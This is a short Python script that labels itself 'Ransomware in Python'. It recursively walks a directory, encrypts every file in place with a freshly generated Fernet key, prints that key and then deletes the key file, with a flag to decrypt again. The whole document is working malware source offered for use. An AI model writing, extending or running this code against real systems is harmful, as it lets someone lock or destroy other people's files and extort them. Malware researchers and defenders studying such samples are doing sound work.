import os
import sys
import argparse
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("ransomware_key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    if not os.path.exists("ransomware_key.key"):
        print("Key file not found. Please generate a key first.")
        sys.exit(1)
    return open("ransomware_key.key", "rb").read()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

def main():
    parser = argparse.ArgumentParser(description="Ransomware in Python")
    parser.add_argument("--path", type=str, help="Path to the directory or file")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt files")
    parser.add_argument("--key", type=str, help="Decryption key")

    args = parser.parse_args()
    
    if not os.path.exists(args.path):
        print(f"Path {args.path} does not exist.")
        sys.exit(1)
    
    if args.decrypt:
        if not args.key:
            print("Please provide a decryption key.")
            sys.exit(1)
        key = args.key.encode()
        for root, dirs, files in os.walk(args.path):
            for file in files:
                decrypt_file(os.path.join(root, file), key)
        print("Decryption completed.")
    else:
        generate_key()
        key = load_key()
        for root, dirs, files in os.walk(args.path):
            for file in files:
                encrypt_file(os.path.join(root, file), key)
        print(f"Encryption complete. Save this key for decryption: {key.decode()}")
        os.remove("ransomware_key.key")

if __name__ == "__main__":
    main()
